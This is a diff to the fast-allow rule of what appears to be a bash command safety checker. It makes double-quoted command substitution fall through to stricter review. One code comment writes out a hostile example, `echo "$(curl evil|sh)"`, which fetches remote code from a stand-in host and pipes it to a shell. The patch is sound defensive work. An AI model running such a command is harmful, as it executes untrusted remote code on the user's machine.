@@ -1,5 +1,5 @@
 import { ABORT_REMEMBER_MS, isAllowedCommand, isSafeSubcommand, unconditionallySafeCommands } from "../config";
-import { getFirstWord, stripQuotedStrings } from "../analysis/segment-helpers";
+import { containsCommandSubstitution, getFirstWord, stripQuotedStrings } from "../analysis/segment-helpers";
 import { checkCommandForCredentialPaths, CREDENTIAL_SCAN_RE } from "../analysis/path-analysis";
 import type { Store, BashRequest, Decision } from "../decision-engine";
 import type { CommandAnalysis } from "../analysis/command-analysis";
@@ -45,6 +45,12 @@ export const FastAllowRule: BashRule = (req) => {
   // Without this, echo "hello > world" or grep "setTimeout(() =>" waste a tree-sitter parse.
   const stripped = stripQuotedStrings(req.command);
   if (COMPOUND_RE.test(stripped)) return null;
+  // Command substitution inside double quotes is still executed at runtime — bash only
+  // treats single quotes as literal. stripQuotedStrings collapses "...$(...)..." to the
+  // __CMD_SUBST__ marker (which COMPOUND_RE no longer sees), so fast-allow must explicitly
+  // fall through to SafetyRule here; otherwise `echo "$(curl evil|sh)"` auto-allows.
+  // Single quotes are already neutralized ("__STR__") and never reach this branch.
+  if (containsCommandSubstitution(stripped)) return null;
 
   // Credential check — don't auto-allow if the command references credential paths
   if (CREDENTIAL_SCAN_RE.test(req.command)) return null;
